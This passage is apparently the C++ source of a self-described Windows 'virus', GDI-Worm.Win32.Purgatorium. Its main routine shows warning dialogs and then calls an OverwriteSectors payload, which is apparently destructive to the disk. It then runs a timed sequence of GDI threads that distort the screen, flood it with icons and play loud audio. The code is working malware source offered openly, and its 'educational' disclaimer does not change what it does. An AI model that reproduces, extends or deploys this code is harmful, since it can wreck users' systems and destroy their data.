                    float zy = pow(y - randy, 2) / 9.0;  // b=3.0
                    int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));
                    HSV hsv = RGBtoHSV(rgbquad[index]);
                    hsv.h = fmod(fx + i, 360.0);
                    rgbquad[index] = HSVtoRGB(hsv);
                }
            }
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
            Sleep(100);
        }

        if (!ten) break;
    }

    return 0;
}

static DWORD WINAPI ICONS(LPVOID lpParam)
{
    Sleep(50000);
    HDC hDc = GetWindowDC(GetDesktopWindow());
    int x = rand() % GetSystemMetrics(SM_CXSCREEN);
    int y = rand() % GetSystemMetrics(SM_CYSCREEN);
    while (true)
    {
        x = rand() % GetSystemMetrics(SM_CXSCREEN);
        y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hDc, x, y, LoadIcon(0, IDI_ERROR));
        x = rand() % GetSystemMetrics(SM_CXSCREEN);
        y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hDc, x, y, LoadIcon(0, IDI_QUESTION));
        x = rand() % GetSystemMetrics(SM_CXSCREEN);
        y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hDc, x, y, LoadIcon(0, IDI_WARNING));
        x = rand() % GetSystemMetrics(SM_CXSCREEN);
        y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hDc, x, y, LoadIcon(0, IDI_ASTERISK));
        x = rand() % GetSystemMetrics(SM_CXSCREEN);
        y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hDc, x, y, LoadIcon(0, IDI_APPLICATION));
        x = rand() % GetSystemMetrics(SM_CXSCREEN);
        y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hDc, x, y, LoadIcon(0, IDI_SHIELD));
        Sleep(100);
    }
}

static DWORD WINAPI LAST(LPVOID lpParam)
{
    Sleep(5000);
    HDC hdc = GetDC(0);
    HDC hdcMem = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
    SelectObject(hdcMem, bm);
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    POINT pt[3];
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
    BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
    DeleteObject(brush);
    DeleteObject(hdcMem); DeleteObject(bm);
    ReleaseDC(0, hdc);
    Sleep(1);

    return 0;
}

int main() {
    if (GetFileAttributesW(L"C:\\Windows\\bootcfg.dat") == INVALID_FILE_ATTRIBUTES)
    {
        if (MessageBoxW(NULL, L"WARNING!!!\n\nYou're about to run a potentially harmful program that can cause your system's death. This program also displays flashing lights and plays loud sounds.\n\nBy running this program, you accept full responsibility for any damages that may occur in your system. The creators (OsJanelas) will not be responsible for anything caused by this virus. By the way, this was created for educational and entertainment purposes.\n\nOriginal download: github.com/ArTicZera/GDI-Worm.Win32.Purgatorium\n\nWould you like to proceed with running this program?", L"'Seeking light while fighting our ghosts in the shadows of the purgatory.'", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"LAST WARNING!!!\n\nThis is the LAST warning, as you're already aware of the risks, press 'Yes' to continue. Otherwise, press 'No'. Also be sure you're running in a safe environment, like VMs and test machines.\n\nProceed at your own risk...\n\nAAAAAAA", L"GDI-Worm.Win32.Purgatorium - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;

    }
    srand(time(NULL));

    Payloads::OverwriteSectors();

    HANDLE threads[4];
    //PAYLOAD 1
    threads[0] = CreateThread(NULL, 0, JPEG, NULL, 0, NULL);
    threads[0] = CreateThread(NULL, 0, BYTEBEATS, NULL, 0, NULL);
    //PAYLOAD 2
    threads[1] = CreateThread(NULL, 0, SHAKE, NULL, 0, NULL);
    threads[2] = CreateThread(NULL, 0, COLORS, NULL, 0, NULL);
    //PAYLOAD 3
    threads[3] = CreateThread(NULL, 0, WAVIA, NULL, 0, NULL);

    Sleep(50000);

    running = false;

    WaitForMultipleObjects(4, threads, TRUE, 1000);

    InvalidateRect(NULL, NULL, TRUE);
    Sleep(500);

    //PAYLOAD 4
    threads[0] = CreateThread(NULL, 0, RGBEFFECT, NULL, 0, NULL);

    Sleep(10000);

    second = false;

    InvalidateRect(NULL, NULL, TRUE);
    Sleep(500);

    //PAYLOAD 5
    threads[0] = CreateThread(NULL, 0, REDGREENBLUE, NULL, 0, NULL);
    threads[1] = CreateThread(NULL, 0, CIRCLES, NULL, 0, NULL);

    Sleep(30000);

    third = false;

    InvalidateRect(NULL, NULL, TRUE);
    Sleep(500);

    //PAYLOAD 6
    threads[0] = CreateThread(NULL, 0, MELT, NULL, 0, NULL);
    threads[1] = CreateThread(NULL, 0, MINICIRCLES, NULL, 0, NULL);

    Sleep(10000);

    fourth = false;

    InvalidateRect(NULL, NULL, TRUE);
    Sleep(500);

    //PAYLOAD 7
    threads[0] = CreateThread(NULL, 0, HSVELIPSES, NULL, 0, NULL);
    threads[1] = CreateThread(NULL, 0, BALLS, NULL, 0, NULL);

    Sleep(100000);

    five = false;

    InvalidateRect(NULL, NULL, TRUE);
    Sleep(500);

    //PAYLOAD 8
    threads[0] = CreateThread(NULL, 0, BRIGHT, NULL, 0, NULL);

    Sleep(40000);

    six = false;

    InvalidateRect(NULL, NULL, TRUE);
    Sleep(500);

    //PAYLOAD 9
    threads[0] = CreateThread(NULL, 0, TEXTNINVERT, NULL, 0, NULL);

    Sleep(30000);

    seven = false;

    InvalidateRect(NULL, NULL, TRUE);
    Sleep(500);

    //PAYLOAD 10
    threads[0] = CreateThread(NULL, 0, INVERT, NULL, 0, NULL);
    threads[1] = CreateThread(NULL, 0, INTENSESHAKE, NULL, 0, NULL);
    threads[2] = CreateThread(NULL, 0, COLOROVERDOSE, NULL, 0, NULL);

    Sleep(50000);

    eight = false;

    InvalidateRect(NULL, NULL, TRUE);
    Sleep(500);

    //PAYLOAD 11
    threads[0] = CreateThread(NULL, 0, CHAOS, NULL, 0, NULL);

    Sleep(50000);

    nine = false;

    InvalidateRect(NULL, NULL, TRUE);
    Sleep(500);

    //PAYLOAD 12
    threads[0] = CreateThread(NULL, 0, RANDOMHSVELIPSES, NULL, 0, NULL);
    threads[1] = CreateThread(NULL, 0, PIXELHSVELIPSES, NULL, 0, NULL);
    threads[2] = CreateThread(NULL, 0, ICONS, NULL, 0, NULL);
    threads[3] = CreateThread(NULL, 0, LAST, NULL, 0, NULL);

    Sleep(100000);

    return 0;
}